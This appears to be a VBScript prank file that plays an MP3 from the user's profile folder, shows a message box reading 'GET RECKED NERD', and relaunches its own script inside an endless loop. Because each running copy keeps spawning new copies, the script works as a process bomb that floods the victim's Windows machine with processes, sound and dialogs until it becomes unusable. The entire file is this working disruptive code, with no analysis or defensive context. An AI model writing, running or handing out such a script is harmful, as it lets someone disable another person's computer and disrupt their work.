Set WshShell = CreateObject("wscript.Shell")
UserProfilePath = WshShell.ExpandEnvironmentStrings("%UserProfile%")
PathFile = UserProfilePath & "\funni.mp3"
'MsgBox qq(PathFile)
'Return = WshShell.Run(qq(PathFile),1)

Function qq(strIn)
    qq = Chr(34) & strIn & Chr(34)
End Function 

do

Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")

' Play audio
oPlayer.URL = PathFile
oPlayer.controls.play 
While oPlayer.playState <> 1 ' 1 = Stopped
  WScript.Sleep 100
Wend

' Release the audio file
oPlayer.close

x=msgbox("GET RECKED NERD" ,0+16, "DUMMY")
CreateObject("WScript.Shell").Run WScript.ScriptFullName
'CreateObject("WScript.Shell").Run("""deez.vbs""")
'Wscript.Quit
loop